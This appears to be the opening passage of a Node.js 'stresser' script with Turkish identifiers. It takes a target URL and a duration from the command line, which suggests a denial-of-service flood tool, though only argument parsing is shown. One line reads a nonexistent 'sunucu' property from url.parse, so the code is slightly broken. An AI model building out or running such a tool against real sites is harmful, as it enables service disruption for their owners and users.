...
if (process.argv.length <= 2) {
	console.log("Kullanim: node stresserme.js <url> <zaman>");
	console.log("Kullanim: node stresserme.js <http://stresser.me> <60>");
	process.exit(-1);
}
var hedef = process.argv[2];
var donustur = url.parse(hedef);
var sunucu = url.parse(hedef).sunucu;
var zaman = process.argv[3];
